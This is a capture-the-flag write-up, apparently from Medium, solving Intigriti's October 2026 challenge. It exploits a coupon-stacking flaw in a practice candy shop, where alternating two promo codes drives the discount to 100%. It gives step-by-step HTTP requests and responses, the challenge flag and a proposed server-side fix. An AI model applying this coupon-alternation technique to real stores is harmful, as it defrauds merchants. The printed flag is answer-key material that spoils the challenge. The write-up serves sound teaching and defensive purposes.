# I paid 0 euros for a 666 euro box of candy

- **Source URL:** https://obaskly.medium.com/i-paid-0-euros-for-a-666-euro-box-of-candy-a-coupon-stacking-bug-in-intigritis-october-challenge-a0364b78abc7
- **Fetched from:** https://obaskly.medium.com/i-paid-0-euros-for-a-666-euro-box-of-candy-a-coupon-stacking-bug-in-intigritis-october-challenge-a0364b78abc7?source=rss-5638f1c49663------2
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/14960 (id 14960)
- **Method:** medium-rss-feed (full content:encoded) readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
- **Author/Published (RSS):** Obaskly / Tue, 27 Oct 2026 04:54:25 GMT

The shop wanted 666 euros for a single box of candy. I had 66.

I walked away with the box, a confirmed order and the flag, and the receipt says I paid 0. The bug behind it fits in one sentence, and I will get to it after the dead end that had me convinced coupons were a waste of time.

**The setup**

The real target is a Halloween store at /challenge on the challenge domain; [https://challenge-1026.challenges.intigriti.io/challenge](https://challenge-1026.challenges.intigriti.io/challenge).

It sells five ordinary sweets between 8.90 and 14.90 euros, plus one special item: “The Midnight Collection”, 666 euros, badge “Only one available”. The home page hints that the box is there until midnight or until somebody claims it. Every session starts with 66 euros of store credit, and a banner at the top advertises a promo code, NIGHT20, for 20% off the Midnight Collection.

The puzzle writes itself. To afford that box I needed roughly 90% off. The cart page adds a twist: once something is in the bag, it cannot be removed. That made every experiment a bit expensive, so I used a fresh session each time.

The shop front end is a thin layer over a JSON API, and app.js shows the whole surface:

GET /api/session

GET /api/products

GET /api/cart

POST /api/cart/items {"productId": "…"}

POST /api/cart/coupon {"code": "…"}

POST /api/cart/coupon/remove {"code": "…"}

POST /api/newsletter {"email": "…"}

POST /api/checkout

One detail in the JavaScript stood out right away. The receipt modal shows a flag whenever the checkout response contains one. So the goal was a successful checkout of the right item, and the only real obstacle was the price.

**A weird error before I even started**

My first attempt to add the vault to the cart came back with an HTML error page:

501 Unsupported method (‘{“productId”:”citrus-loops”}POST’)

I had sent midnight-vault, not citrus-loops. A few minutes later another request died the same way, this time with a junk product ID I had never typed either.

My guess, and it is only a guess, is that other people were hammering the same challenge and the backend sometimes leaves part of a request body unread on a connection shared between users, so the leftover bytes land in front of the next request line. It had nothing to do with the solution. If you replay the requests below and one of them dies with a 501 like this, just send it again.

**Why I was stuck at 50%**

Before looking for anything clever, I tried the coupons the way a normal customer would.

NIGHT20 takes 20% off. Apply it again and you get 409 coupon\_already\_applied. The lowercase version gets the same answer, so the check ignores case.

The second code is hidden. Trying NEWS30 straight away returns “Join the newsletter to reveal this code”. Subscribing through the footer form hands it over. There is no email verification, I typed made-up addresses and got the code every time, and it only works in the session that subscribed.

With both codes in the cart the discounts add up: 33,300 off a 66,600 subtotal (everything is in cents), so exactly 50%. A few guessed codes (FREE, WELCOME, HALLOWEEN, MIDNIGHT) were rejected as unrecognised.

That left me at about 333 euros against 66 euros of credit, which is nowhere near enough.

The field that should not exist

Then I went back to what the cart sends for each promotion:

{“code”: “NIGHT20”, “percent”: 20, “amount”: 13320, “count”: 1}

A count. And in app.js, the cart view appends “ x 3” to the promotion line whenever the count is above 1.

A code can only be applied once, yet the server tracks how many times it was applied, and the front end is already built to show it. Either that is dead code, or there is a way to push the number higher.

Look at how I had tested duplicates so far. Every time, I sent the same code twice in a row. What if the server only remembers the last code I used?

The proof, one request at a time

Everything below was captured in Burp, one request after the other. No parallel requests are involved. I shortened the responses: the boilerplate headers are gone, and the product object inside “items” is cut, since it is the same every time.

**Step 1. Start a session.**

GET /api/session HTTP/1.1

Host: challenge-1026.challenges.intigriti.io

HTTP/2 200 OK

Set-Cookie: session=waHa66w09b0Qx0KFfG5qCpqaGSk8yfoH5g1QBP8IBAc; Path=/

Content-Type: application/json; charset=utf-8

{"ok":true,"credit":6600}

**Step 2. Subscribe to the newsletter to reveal NEWS30.**

POST /api/newsletter HTTP/1.1

Host: challenge-1026.challenges.intigriti.io

Cookie: session=waHa66w09b0Qx0KFfG5qCpqaGSk8yfoH5g1QBP8IBAc

Content-Type: application/json

Content-Length: 25

{"email":"a@example.com"}

HTTP/2 200 OK

Content-Type: application/json; charset=utf-8

{"ok":true,"code":"NEWS30","message":"Your first-order code is ready."}

**Step 3. Put the Midnight Collection in the bag.**

POST /api/cart/items HTTP/1.1

Host: challenge-1026.challenges.intigriti.io

Cookie: session=waHa66w09b0Qx0KFfG5qCpqaGSk8yfoH5g1QBP8IBAc

Content-Type: application/json

Content-Length: 30

{"productId":"midnight-vault"}

HTTP/2 200 OK

Content-Type: application/json; charset=utf-8

{"ok":true,"message":"The Midnight Collection added to your bag.","cart":{"items":\[{"id":"midnight-vault", … ,"price":66600,"quantity":1,"lineTotal":66600}\],"itemCount":1,"subtotal":66600,"discount":0,"total":66600,"credit":6600,"canCheckout":false,"promotions":\[\]}}

**Step 4. Apply NIGHT20. This is the normal, expected behaviour.**

POST /api/cart/coupon HTTP/1.1

Host: challenge-1026.challenges.intigriti.io

Cookie: session=waHa66w09b0Qx0KFfG5qCpqaGSk8yfoH5g1QBP8IBAc

Content-Type: application/json

Content-Length: 18

{"code":"NIGHT20"}

HTTP/2 200 OK

Content-Type: application/json; charset=utf-8

{"ok":true,"message":"20% promotion applied.","cart":{"items":\[ … \],"itemCount":1,"subtotal":66600,"discount":13320,"total":53280,"credit":6600,"canCheckout":false,"promotions":\[{"code":"NIGHT20","percent":20,"amount":13320,"count":1}\]}}

**Step 5. Send the exact same request again. The server refuses, as it should.**

POST /api/cart/coupon HTTP/1.1

Host: challenge-1026.challenges.intigriti.io

Cookie: session=waHa66w09b0Qx0KFfG5qCpqaGSk8yfoH5g1QBP8IBAc

Content-Type: application/json

Content-Length: 18

{"code":"NIGHT20"}

HTTP/2 409 Conflict

Content-Type: application/json; charset=utf-8

{"ok":false,"error":"coupon\_already\_applied","message":"Coupon already applied."}

**Step 6. Now put the other code in between. NEWS30 goes through.**

POST /api/cart/coupon HTTP/1.1

Host: challenge-1026.challenges.intigriti.io

Cookie: session=waHa66w09b0Qx0KFfG5qCpqaGSk8yfoH5g1QBP8IBAc

Content-Type: application/json

Content-Length: 17

{"code":"NEWS30"}

HTTP/2 200 OK

Content-Type: application/json; charset=utf-8

{"ok":true,"message":"30% promotion applied.","cart":{"items":\[ … \],"itemCount":1,"subtotal":66600,"discount":33300,"total":33300,"credit":6600,"canCheckout":false,"promotions":\[{"code":"NIGHT20","percent":20,"amount":13320,"count":1},{"code":"NEWS30","percent":30,"amount":19980,"count":1}\]}}

**Step 7. NIGHT20 again. This is the request that was rejected in step 5, and this time it is accepted. The count goes to 2.**

POST /api/cart/coupon HTTP/1.1

Host: challenge-1026.challenges.intigriti.io

Cookie: session=waHa66w09b0Qx0KFfG5qCpqaGSk8yfoH5g1QBP8IBAc

Content-Type: application/json

Content-Length: 18

{"code":"NIGHT20"}

HTTP/2 200 OK

Content-Type: application/json; charset=utf-8

{"ok":true,"message":"20% promotion applied.","cart":{"items":\[ … \],"itemCount":1,"subtotal":66600,"discount":46620,"total":19980,"credit":6600,"canCheckout":false,"promotions":\[{"code":"NIGHT20","percent":20,"amount":26640,"count":2},{"code":"NEWS30","percent":30,"amount":19980,"count":1}\]}}

**Step 8. NEWS30 once more. Two of each is 2 x 20% + 2 x 30% = 100%.**

POST /api/cart/coupon HTTP/1.1

Host: challenge-1026.challenges.intigriti.io

Cookie: session=waHa66w09b0Qx0KFfG5qCpqaGSk8yfoH5g1QBP8IBAc

Content-Type: application/json

Content-Length: 17

{"code":"NEWS30"}

HTTP/2 200 OK

Content-Type: application/json; charset=utf-8

{"ok":true,"message":"30% promotion applied.","cart":{"items":\[ … \],"itemCount":1,"subtotal":66600,"discount":66600,"total":0,"credit":6600,"canCheckout":true,"promotions":\[{"code":"NIGHT20","percent":20,"amount":26640,"count":2},{"code":"NEWS30","percent":30,"amount":39960,"count":2}\]}}

The total is **0** and canCheckout is true.

**Step 9. Check out.**

POST /api/checkout HTTP/1.1

Host: challenge-1026.challenges.intigriti.io

Cookie: session=waHa66w09b0Qx0KFfG5qCpqaGSk8yfoH5g1QBP8IBAc

Content-Type: application/json

Content-Length: 2

{}

HTTP/2 200 OK

Content-Type: application/json; charset=utf-8

{"ok":true,"receipt":{"orderId":"BLE-FFD5D79F59","paid":0,"credit":6600,"message":"Your order is confirmed and being prepared.","flag":"INTIGRITI{094638e6-ba2f-4c50–8bb4–41ced0d5debd}"}}

**Paid is 0, and the 66 euros of credit is still sitting there untouched.**

The only requests that matter for the bypass are the four coupon calls in the order NIGHT20, NEWS30, NIGHT20, NEWS30. Each cycle through the two codes adds 50% to the discount, and nothing stops you from going around again.

What the server is actually checking

I ran a few more sequences on fresh sessions to see exactly when the 409 appears. A is NIGHT20 and B is NEWS30:

A A A 200, 409, 409

A A B A 200, 409, 200, 200

A B B 200, 200, 409

A B A A 200, 200, 200, 409

A B A B A B 200, 200, 200, 200, 200, 200

The pattern is the same every time. A coupon is rejected when it is identical to the one applied just before it, and accepted in every other case. Whatever else is in the cart does not matter.

A parallel burst looks like a race condition, but it is not one

If you fire both codes at the server from several threads at the same time, you get a messy mix of 200s and 409s and different counts on every run. That looks like a classic race on the “already applied” check, and it is an easy theory to believe. It is also wrong. The sequential run above needs no concurrency at all. The 409s in a parallel burst are just two copies of the same code that happened to land back to back, and the 200s are the cases where the codes alternated.

**Why it works, and the fix**

I never saw the server code, so this is inference from the behaviour. The coupon endpoint seems to compare the incoming code with the most recently applied one, instead of checking whether the code is anywhere in the cart. If they match, it answers 409. If not, it adds the promotion, or bumps the count if the code is already there.

The fix is to check against the whole set of applied codes, so a second application of the same code fails no matter what came in between. The server should also recompute the discount at checkout from the distinct codes and reject any cart where a code has a count above 1.

The cap on the discount hid the problem. Instead of a negative total or an error, the total just bottomed out at 0 and the cart looked valid.
